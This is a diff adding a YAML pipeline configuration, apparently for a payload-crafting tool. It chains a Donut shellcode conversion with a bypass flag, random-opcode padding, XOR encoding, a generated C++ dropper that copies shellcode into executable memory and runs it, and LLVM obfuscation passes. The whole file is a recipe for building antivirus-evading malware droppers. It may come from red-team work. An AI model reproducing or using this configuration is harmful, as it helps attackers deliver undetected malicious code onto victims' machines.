@@ -1,0 +1,67 @@
+vars:
+  passes: &passes !args
+    name: "--passes"
+    default: "function(bcf),function(split),function(icall),funwra,ipobf,strenc"
+  donut_args: &donut_args !args ["--donut-args", "list"]
+chain: !Chain
+  links:
+    - !stdin
+      &stdin
+      name: Stdin
+
+    - !converter.Donut
+      input: *stdin
+      name: Donut transform
+      donut_args: !flatten
+        - "--arch 2"
+        - "--entropy 3"
+        - "--bypass 3"
+        - "--compress 2"
+        - *donut_args
+
+    - !converter.Donut
+      name: Obfuscate donut payload
+      cmd: obfuscate
+
+    - !modifier.RNDOpcodes
+      &rndf
+      name: Prepend opcodes
+      n: 300-500
+      where: start
+
+    - !modifier.RNDOpcodes
+      &rndb
+      name: Push opcodes back
+      n: 300-500
+      where: end
+
+    - !modifier.XOREncode
+      &xor
+      name: Xor encode
+      key_length: 30
+
+    - !codewriter.cpp
+      name: Generate dropper
+      functions: dynamic
+      output_type: exe
+      payload_placement: data
+      decoders:
+        - *xor
+        - *rndb
+        - *rndf
+      blocks:
+        - !cpp.alloc
+          name: Alloc memory and copy shellcode
+          method: basic
+          protection: rx
+
+        - !cpp.clean
+          name: Clean raw memory
+          variable: raw
+
+        - !cpp.drop
+          name: Execute shellcode
+
+    - !compiler.LLVMPass
+      name: Compile
+      passes: *passes
